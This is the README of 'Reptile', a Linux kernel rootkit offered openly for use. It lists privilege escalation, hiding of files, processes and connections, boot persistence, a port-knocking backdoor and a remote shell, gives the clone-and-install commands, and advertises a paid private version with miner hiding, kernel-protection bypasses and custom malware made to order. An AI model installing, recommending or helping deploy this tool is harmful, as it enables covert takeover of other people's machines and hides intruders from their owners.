# Reptile 2.0 (beta)

<img align="left" src="https://imgur.com/nqujOlz.png">

<br><br><br><br><br>Reptile is a Linux LKM rootkit. **Beta version, be careful when using it.**
<br><br><br><br><br>

## Features

- Give root to unprivileged users
- Hide files and directories
- Hide processes
- Hide himself
- Hide TCP/IP connections
- Hidden boot persistence
- File content tampering
- Some obfuscation techniques
- ICMP/UDP/TCP port-knocking backdoor
- Full TTY/PTY shell with file transfer
- Client to handle Reptile Shell
- Shell connect back each X times (not default)
   
## Install
```
apt-get install linux-headers-$(uname -r)
perl -MCPAN -e "install String::Unescape"
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./setup.sh install
```
## Uninstall
```
./setup.sh remove
```
## Usage

See [Wiki](https://github.com/f0rb1dd3n/Reptile/wiki/Usage) to usage details.

## Warning

Some functions of this module is based on another rootkits. Please see the references!

## References

- “[LKM HACKING](http://www.ouah.org/LKM_HACKING.html)”, The Hackers Choice (THC), 1999;
- https://github.com/milabs
- https://github.com/mncoppola/suterusu
- https://github.com/m0nad/Diamorphine.git
- https://github.com/David-Reguera-Garcia-Dreg/enyelkm.git
- https://github.com/creaktive/tsh
- http://www.drkns.net/kernel-who-does-magic/
- https://github.com/brenns10/lsh

## Thanks

Special thanks to my friend [Ilya V. Matveychikov](https://github.com/milabs) for the [KHOOK](https://github.com/milabs/khook) framework and [kmatryoshka](https://github.com/milabs/kmatryoshka) loader.

## Disclaimer

If you wanna more features like:<br>

- CPU usage hiding (for miners)
- Generic binary that loads to any version of kernel
- Best way to file tampering
- Best way to hide files/process/dir
- Best obfuscation
- Bypass some kernel protections
- A kernel module that survive to kernel update
- Hiding connections and packets of other protocols

There is a private version of Reptile. Even if you wanna a new feature or a new kernel module on demand, send an e-mail to f0rb1dd3n@tuta.io to get more information.

<br>
<p align="center">
   <img src="https://imgur.com/RdYgb1T.gif">
</p>
